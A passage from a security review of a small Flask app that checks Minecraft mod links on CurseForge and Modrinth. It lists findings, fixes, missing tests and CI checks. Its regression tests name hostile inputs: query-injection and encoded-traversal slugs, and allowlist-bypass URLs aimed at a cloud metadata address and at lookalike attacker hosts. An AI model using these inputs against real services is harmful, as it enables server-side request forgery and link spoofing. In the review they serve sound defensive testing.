`{"urls": {"a":"b"}}`, `{"urls": [1,2]}` and a non-JSON body asserts `400`, and asserts
`modlist.check_urls` was never reached.

---

### F-2026-09-17-9 — LOW — Unencoded Modrinth slug is interpolated into the API URL

**File:** `providers/modrinth.py:19-27, 61, 72`

```python
def slug_from_url(url: str) -> str | None:
    url = url.strip().rstrip("/")
    m = re.search(r"/(project|mod|mods)/([^/?#]+)$", url)
    if m:
        return m.group(2)
    parts = url.split("/")
    return parts[-1] if parts else None        # fallback keeps ? and # characters

...
    project_url = f"{API_BASE}/project/{slug}"                              # line 61
    versions_url = f"{API_BASE}/project/{slug}/version?offset=..."          # line 72
```

**Why dangerous:** The regex branch correctly excludes `/`, `?` and `#`, but the **fallback**
branch does not — it takes everything after the last `/`. The result is interpolated into a
request URL with no percent-encoding. Confirmed:

```
'https://modrinth.com/mod/sodium?bogus=1'   -> slug 'sodium?bogus=1'
   -> GET https://api.modrinth.com/v2/project/sodium?bogus=1        (query injection)
'https://modrinth.com/mod/..%2f..%2fadmin'  -> slug '..%2f..%2fadmin'
   -> GET https://api.modrinth.com/v2/project/..%2f..%2fadmin       (encoded traversal)
'https://modrinth.com/mod/x#frag'           -> slug 'x#frag'
   -> GET https://api.modrinth.com/v2/project/x#frag                (fragment truncation)
```

Impact is genuinely limited and I am not going to overstate it: the scheme, host and path
prefix are fixed, so the request cannot be redirected to another host; the target is
Modrinth's public, unauthenticated, read-only v2 API; and no credential is attached to
Modrinth calls. The `..%2f` form depends on the upstream server decoding `%2F` before
routing, which most do not. The concrete consequences are that a crafted slug can append
arbitrary query parameters to the upstream call, and that `#` truncates the intended path
(`/version` is dropped from line 72), producing confusing results. It is unvalidated input
reaching a URL builder — worth closing on principle before someone moves this pattern
somewhere that matters.

The corresponding CurseForge path is **not** affected: the slug is passed via
`params={"gameId": GAME_ID, "slug": slug}` (`providers/curseforge.py:150`) and encoded by
`requests`. The cache path is also **not** affected: `safe_name()`
(`providers/__init__.py:8-9`) reduces the slug to `[A-Za-z0-9._-]` before it touches the
filesystem.

**Exploit:** Paste `https://modrinth.com/mod/sodium?bogus=1`; the server issues
`GET https://api.modrinth.com/v2/project/sodium?bogus=1`. Self-directed and low-value, which
is why this is LOW rather than MEDIUM.

**Fix:** Validate the slug against Modrinth's actual character set and encode it:

```python
import urllib.parse

SLUG_RE = re.compile(r"^[\w!@$()`.+,\"\-']{3,64}$")

def slug_from_url(url: str) -> str | None:
    ...
    slug = m.group(2) if m else url.split("/")[-1]
    slug = urllib.parse.unquote(slug)
    return slug if SLUG_RE.match(slug) else None
```

`get_mod_data` already raises `ValueError("Not a Modrinth mod link")` on a `None` slug
(`providers/modrinth.py:58-59`), so rejection produces correct user-facing copy for free.
Then use `urllib.parse.quote(slug, safe="")` at the interpolation sites, or pass the slug
through `params`.

**Regression test:** Assert `slug_from_url` returns `None` for `.../mod/sodium?bogus=1`,
`.../mod/..%2f..%2fadmin` and `.../mod/x#frag`, and returns `"sodium"` for the legitimate
form.

---

### Lower-severity (verified)

- **F-2026-09-17-10 — LOW — Orphaned npm lockfile with no manifest backing.**
  *(Corrected after publication: this originally described `package-lock.json` as tracked in
  git. It was not — `.gitignore:341-342` ignores both `package-lock.json` and `node_modules/`,
  and only `package.json` was tracked. The supply-chain surface was therefore local to this
  checkout and was never distributed to anyone cloning the repository, which lowers the
  practical exposure; the finding and its fix are otherwise unchanged.)*
  `package.json` declares **no** `dependencies` and **no** `devDependencies`, yet the local
  `package-lock.json` pins **83 packages** with a root entry requiring `autoprefixer ^10.4.23`,
  `postcss ^8.5.6` and `tailwindcss ^3.4.19`. Both `CLAUDE.md` files state there is no
  frontend build step and that `npm install` is not required, and `static/styles.css` is
  authored by hand — so none of this tree is used. The manifest and lockfile disagree, which
  means `npm ci` fails outright and `npm install` would silently resolve and execute install
  scripts (`node_modules/fsevents@2.3.3` carries `hasInstallScript: true`) for dependencies
  nothing needs. That is 83 packages of supply-chain surface and Dependabot noise for zero
  benefit. `node_modules/` is correctly untracked. Confirmed unused, not merely unneeded:
  there is no `tailwind.config.*` or `postcss.config.*` anywhere, so the declared build could
  not run even if invoked; `static/styles.css` contains zero Tailwind markers; and
  `templates/index.html` references only `/static/` assets and Google Fonts.
  **Fix (applied):** deleted `package-lock.json`, `node_modules/` and `package.json`.
- **F-2026-09-17-11 — LOW — `pipreqs` pinned as a runtime dependency.** `requirements.txt:7`
  pins `pipreqs==0.4.13`, a development-time import scanner, which drags `docopt==0.6.2` and
  `yarg==0.1.10` into every production install (both confirmed present in the venv). `docopt`
  has had no release since 2014 and is effectively unmaintained. Production runtime needs
  none of the three. **Fix:** move `pipreqs` to a `requirements-dev.txt`. Also review
  `python-dateutil==2.9.0.post0` — grep shows no `dateutil` import anywhere in the codebase,
  so it appears to be another unused pin (it is not a transitive requirement of the other
  four). Note that `SECURITY.md` explicitly instructs operators to install only what
  `requirements.txt` lists, which makes the contents of that file a stated security boundary.
- **F-2026-09-17-12 — LOW — No security response headers.** Confirmed absent on `GET /`:
  `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`,
  `Referrer-Policy`, `Strict-Transport-Security`. The app renders third-party mod names, and
  although it does so safely today via `textContent` (see "What is done well"), a CSP is the
  defence-in-depth that survives a future contributor reaching for `innerHTML`. Absent
  `X-Frame-Options`/`frame-ancestors`, the page can also be framed by any site.
  **Fix:** an `@app.after_request` hook setting
  `Content-Security-Policy: default-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:; script-src 'self'; frame-ancestors 'none'; base-uri 'none'`,
  plus `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`. Verify against
  `templates/index.html:14` (Google Fonts preconnect) and `:93` (`/static/app.js`) — the
  policy above accommodates both, and no inline scripts exist to require a nonce.
- **INFO — `CF_API_KEY` lives in plaintext at `.env`.** Correctly untracked and correctly
  gitignored (`.gitignore:228`), and `git log --all -- .env` confirms it has **never** been
  committed — that is the important part and it was done right. Residual notes: the value is
  world-readable to anything running as this user, it is the only credential the system holds,
  and it has now been read during this review. Rotating it in the CurseForge developer console
  is cheap insurance. Its value is deliberately **not** reproduced in this report. Also
  consider `chmod 600 .env`.
- **INFO — Secret-scanning sweep came back clean.** Grepped the tracked tree for API keys,
  private key headers, JWT secrets, cloud credentials, database URLs, webhook secrets, OAuth
  client secrets and hardcoded passwords across source, tests, docs, comments and seed data.
  The only credential in the project is `CF_API_KEY`, which is read exclusively via
  `os.getenv` (`providers/curseforge.py:18`) and only ever placed in a request header
  (`providers/curseforge.py:22`) — never logged, never returned in a response, never written
  to the cache. `test_compat.py` contains no credentials and no live network calls.

---

## D. Suspicious Areas Requiring Manual Review

1. **`cache_path()` builds a relative path while `clear_cache()` uses an absolute one.**
   `providers/__init__.py:16` joins from the literal `"cache"`, resolved against the **current
   working directory**, whereas `modlist.py:16` derives `CACHE_ROOT` from `__file__`. They
   coincide only when the process is started from the repository root. Under a systemd unit
   without `WorkingDirectory=`, a container with a different `WORKDIR`, or any `cd`-elsewhere
   invocation, providers write to `$CWD/cache` while `/clear_cache` deletes
   `<repo>/cache` — so the endpoint returns `{"status":"ok","message":"Cache cleared."}`
   having deleted nothing, the real cache grows without bound, and stale data is served past
   its TTL indefinitely. **Confirm:** how the app is actually launched in production, then make
   `cache_path()` import and use `modlist.CACHE_ROOT` (or move the constant into `providers`)
   so a single definition governs both. I observed this empirically: calling `cache_path()`
   from the repo root created a `cache/` tree, which I removed — the working tree is clean.
2. **`clear_cache()` reports success unconditionally.** `web.py:24-30` discards the integer
   return value of `modlist.clear_cache()` (`modlist.py:86-92`) and always reports "Cache
   cleared", including when `CACHE_ROOT` does not exist and the function returned `0` having
   done nothing. `main.py:168-171` uses the count correctly. **Confirm:** whether the UI should
   distinguish "cleared N directories" from "there was nothing to clear" — relevant to
   security only insofar as an operator cannot tell whether a remediation action took effect.
3. **`safe_name()` permits `.`, so a slug of dots survives sanitisation.**
   `providers/__init__.py:8-9` allows `[A-Za-z0-9._-]`, meaning `..` passes through unchanged.
   Traversal is **not** currently reachable, because the directory component is always
   `f"{safe_slug}_{safe_mod_id}"` — the trailing `_{id}` guarantees the component can never be
   exactly `..`, and `page` is an internally-generated integer. This is a correct-by-accident
   defence resting on string concatenation rather than on intent. **Confirm:** before any
   future change to the cache key format, and consider `os.path.realpath()` containment
   assertion against `CACHE_ROOT` before every open, or stripping `.` from the allowed set.
4. **Cache files are written non-atomically and are world-readable by default.**
   `providers/curseforge.py:39-40` and `providers/modrinth.py:37-38` `open(..., "w")` and
   `json.dump()` directly to the final path. A crash or a concurrent write mid-`dump` leaves
   truncated JSON that the next read (`json.load`, line 35 / 34) raises on — surfacing through
   F-2026-09-17-7 as a raw `JSONDecodeError` string. With `MAX_WORKERS = 8` and no file
   locking, two threads checking the same mod can interleave. **Confirm:** whether concurrent
   duplicate slugs are possible after `dedupe()` (they are — dedupe runs *after* fetching), and
   fix by writing to a temp file in the same directory then `os.replace()`.
5. **Deployment topology is entirely unverified.** There is no `.github/` directory, no CI
   workflow, no Dockerfile, no compose file, no systemd unit, no Terraform — I confirmed all of
   these are absent. Yet Dependabot is clearly active (three bump commits on `main`), which
   implies GitHub-side configuration not represented in the repository. **Confirm with a
   human:** whether this is deployed anywhere public, what fronts it, whether TLS terminates
   upstream, and whether Dependabot PRs are being merged without any automated verification
   (currently nothing runs `test_compat.py` on a PR).
   **Answered 2026-09-17:** the operator states this is on the public internet, or planned to
   be. The UNSAFE verdict therefore stood as written, and the full remediation in A.1 was
   applied rather than the localhost-only subset. **Still unconfirmed and still worth
   answering:** what fronts the app, whether TLS terminates upstream, and whether the nginx
   `limit_req` block now documented in `README.md` is actually deployed — the per-caller rate
   limit exists only there, not in the application.
6. **`threaded=True` with a module-level provider registry and shared cache.**
   `web.py:34` serves concurrently and `modlist.check_urls` adds an 8-worker pool per request,
   so total concurrency is unbounded across simultaneous requests. No semaphore governs
   outbound API calls globally. **Confirm:** the intended concurrency ceiling, and consider a
   module-level `threading.Semaphore` around outbound provider calls so the CurseForge key sees
   a predictable request rate regardless of inbound load.
7. **`request.get_json(force=True)` parses regardless of `Content-Type`.** `web.py:17`.
   Combined with permissive CORS this slightly widens what a cross-origin `fetch` can deliver
   without triggering a preflight (`text/plain` bodies). **Confirm:** replace with
   `silent=True` per F-2026-09-17-8; low impact but free to fix.

---

## E. Missing Security Tests (negative authz)

**What is covered today:** `test_compat.py` is a genuinely good suite *for what it targets*.
It asserts the verdict logic across 9 cases, enforces cross-interface parity by extracting
`computeCompatibility` from the shipped `static/app.js` and running it under Node against the
same inputs (`test_compat.py:82-109`), guards the two product-copy strings recorded in
`PRODUCT.md`, and asserts the "no fabricated loader / no snapshot" rules
(`test_compat.py:112-148`).

**What is not covered: anything at all touching HTTP.** There is no test file that imports
`web.py`, no use of `app.test_client()`, and no test of `modlist.is_valid_mod_url`,
`providers.modrinth.slug_from_url` or `providers.http.request`. The standard negative-authz
matrix (anonymous → 401, other user → 403/404, wrong role → 403, wrong tenant → 403/404) is
**not applicable** here — there is no auth, no roles and no tenants, so those tests cannot be
written and their absence is not a gap. The gaps that *are* real:

Add a `test_web.py` built on `app.test_client()` covering:

- **Payload limits (F-1):** `POST /analyze` with `MAX_URLS + 1` URLs → `413`, and
  `modlist.check_urls` is never invoked. A body exceeding `MAX_CONTENT_LENGTH` → `413`.
- **Destructive endpoint is guarded (F-2):** `POST /clear_cache` without the operator token →
  `403`, and `modlist.clear_cache` is never invoked (monkeypatch it to raise). With the token →
  `200`. If the route is removed instead, assert `404`.
- **CORS is scoped (F-3):** `OPTIONS /analyze` with `Origin: https://evil.example` does not
  return that origin in `Access-Control-Allow-Origin`; an allowed origin does.
- **Host allowlist is exact (F-4):** parameterised rejection of
  `http://curseforge.com@169.254.169.254/`, `https://curseforge.com.attacker.example/x`,
  `https://modrinth.com.evil.example/mod/x`, `https://evil.example/?ref=modrinth.com`;
  acceptance of the four legitimate host forms. Plus: a resolved mod's returned `url` is always
  on an allowlisted host, so exports cannot carry a spoofed link.
- **Input shape validation (F-8):** `[1,2,3]`, `"hello"`, `{"urls": 5}`, `{"urls": {"a":"b"}}`,
  `{"urls": [1,2]}`, and a non-JSON body each → `400`, never `500`, never reaching
  `check_urls`.
- **Error messages do not leak paths (F-7):** with a provider monkeypatched to raise
  `OSError` containing an absolute path, the response body contains neither the path nor the
  username.
- **Slug validation (F-9):** `slug_from_url` rejects `?`, `#` and encoded-traversal forms.
- **Security headers present (F-12):** `GET /` returns `Content-Security-Policy`,
  `X-Content-Type-Options: nosniff` and `frame-ancestors 'none'`.
- **No network in tests:** assert the suite passes with `requests.get` patched to raise, so
  none of the above silently depends on CurseForge or Modrinth being reachable.

Also worth adding, since `CF_API_KEY` is required at *import* time
(`providers/curseforge.py:19-20`): a test asserting the failure mode is the intended
`EnvironmentError` with its documented message, so the import-time contract described in
`CLAUDE.md` cannot silently regress.

---

## F. Suggested Automated Checks

| Check                             | Tooling                                                                                                           | Catches                                                                                                                                 |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Dependency drift**              | CI step: `pip install -r requirements.txt && pip check`, plus a `pip freeze` diff against the manifest            | F-2026-09-17-5 — the exact failure found here, where merged bumps never reached the runtime                                             |
| **Vulnerable dependencies**       | `pip-audit` (or `safety`) on `requirements.txt` in CI, and `npm audit --audit-level=high` if the npm tree is kept | F-2026-09-17-5, F-2026-09-17-10, F-2026-09-17-11                                                                                        |
| **Hash-pinned installs**          | `pip-compile --generate-hashes` → install with `--require-hashes`                                                 | Supply-chain substitution; makes `SECURITY.md`'s "only install what requirements.txt lists" enforceable rather than aspirational        |
| **Secret scanning**               | `gitleaks` or `trufflehog` as a pre-commit hook **and** in CI (history mode)                                      | Keeps `.env` out of git — currently correct, and worth locking in before it regresses                                                   |
| **Python SAST**                   | `bandit -r . -x .venv,node_modules`                                                                               | Flags `shutil.rmtree` on a shared path, broad `except Exception`, `0.0.0.0` binds — i.e. F-2026-09-17-2, F-2026-09-17-7, F-2026-09-17-6 |
| **Semgrep: Flask rules**          | `semgrep --config p/flask --config p/python --config p/secrets`                                                   | Permissive `CORS(app)` (F-3), missing `MAX_CONTENT_LENGTH` (F-1), `debug=True` regressions, raw exception echo (F-7)                    |
| **Custom Semgrep rule**           | Pattern: URL host validated with `in` against `urlparse(...).netloc` rather than equality on `.hostname`          | F-2026-09-17-4 — the substring-allowlist class, and any future reintroduction                                                           |
| **Custom Semgrep rule**           | Pattern: f-string interpolation of a non-constant into a `requests.*` URL argument                                | F-2026-09-17-9 — unencoded slug in a URL path; would also catch a real SSRF if a provider ever fetches the user URL                     |
| **CodeQL**                        | GitHub default Python + JavaScript packs on PR                                                                    | Taint from `request.get_json` to filesystem and network sinks; XSS sinks in `static/app.js` if `innerHTML` is ever reintroduced         |
| **Container scanning**            | `trivy image` — *only once a Dockerfile exists*                                                                   | Base-image and OS-package CVEs. Not applicable today: no Dockerfile in the repository                                                   |
| **CI gate on the existing suite** | GitHub Actions running `python test_compat.py` + the proposed `test_web.py` on every PR                           | Nothing currently runs on PRs at all, including Dependabot's — this is the single highest-leverage addition                             |
| **Load/abuse harness**            | A script posting an oversized `urls` array against a staging instance                                             | F-2026-09-17-1 — asserts the cap holds end to end, not just in unit tests                                                               |

---

## Closing note

**What held.** The parts of this codebase that were deliberately hardened are genuinely
hardened, and the review confirmed them rather than eroding them. Every documented invariant
in `CLAUDE.md` that has a security dimension survives inspection: third-party strings never
reach an HTML sink, CSV formula injection is neutralised on *both* interfaces, the retry
policy refuses to retry authentication failures, no loader is fabricated, and the API key has
never been committed. The `providers/http.py` error taxonomy in particular is better than what
most projects this size ship. There is no SQL, no ORM, no deserialization, no file upload, no
redirect, no shell execution and no template injection anywhere in the request path — the
attack surface is small because the design is small, and that is a real security property.

**Where the findings cluster.** Every material finding sits at exactly one boundary: **the
edge between the anonymous internet and a credentialed, resource-consuming backend.** The
application was clearly built and reasoned about as a local tool — and as a local tool on
`127.0.0.1`, most of what is written above is theoretical. But `web.py:34` binds `0.0.0.0`,
`web.py:7` tells every origin on the internet it is welcome, and neither endpoint has a cap, a
token, or a rate limit. The gap between "single-user utility" and "public service" was never
closed, and the four lines of `web.py` that constitute the entire HTTP layer are where all six
MEDIUM-and-above findings originate. There is no authorization model to fix here, because
there is nothing to authorize — the correct framing is resource governance and blast-radius
containment, not access control.

**What to fix first, and why in this order.**

1. **Bind to `127.0.0.1` (F-6) and delete `CORS(app)` (F-3).** Two lines. Together they take
   the entire finding set from remotely reachable to locally scoped, which buys time for
   everything else. The frontend is same-origin, so removing CORS breaks nothing — verify with
   one page load.
2. **Cap the input (F-1) and validate its shape (F-8).** One guard block in `analyze()` closes
   the highest-severity finding and the 500s at the same time. This is the fix that protects
   the CurseForge key, which is the one asset whose loss takes the product offline entirely.
3. **Remove or gate `/clear_cache` (F-2).** Deleting the route is the smaller diff and the CLI
   flag already covers the legitimate need.
4. **Reinstall the venv (F-5).** One command, and it closes a gap the repository currently
   misrepresents as already closed. Then add the CI job — Dependabot raising PRs that nothing
   tests and nothing deploys is worse than no Dependabot, because it manufactures the
   appearance of patch hygiene.
5. **Exact-host validation and canonical URLs (F-4).** The link-spoofing path is the only
   finding that reaches *other people* — through the export feature, which is how this tool is
   meant to be shared. Returning a canonical URL rebuilt from the resolved slug fixes it at the
   source and is strictly less code than the alternatives.

The remainder (F-7, F-9, F-10, F-11, F-12) is hygiene: worth doing, not worth blocking on.

A final note on method, because it bears on how much weight to put on the verdict: this review
is static plus local dynamic probing. Every claim above was reproduced against the running
application through the Flask test client, and no claim rests on grep alone. But no external
network calls were made, no CVE databases were consulted, and the production deployment could
not be inspected because the repository does not describe it.

**Item D.5 has since been answered:** the operator confirms a public-internet deployment, or
one planned. That settles the verdict at UNSAFE as written rather than the LOW-risk reading a
localhost-only answer would have supported, and all twelve findings were remediated the same
day — see A.1. Two caveats survive the fix. The per-caller rate limit lives in a documented
nginx block rather than in the application, so it protects nothing until that config is
deployed; and one factual error in the original text has been corrected in place (F-10: the
npm lockfile was gitignored, not tracked). A re-review after the proxy configuration exists,
and once CI runs `test_compat.py` and `test_web.py` on every PR, would be the point at which
the verdict could honestly move.
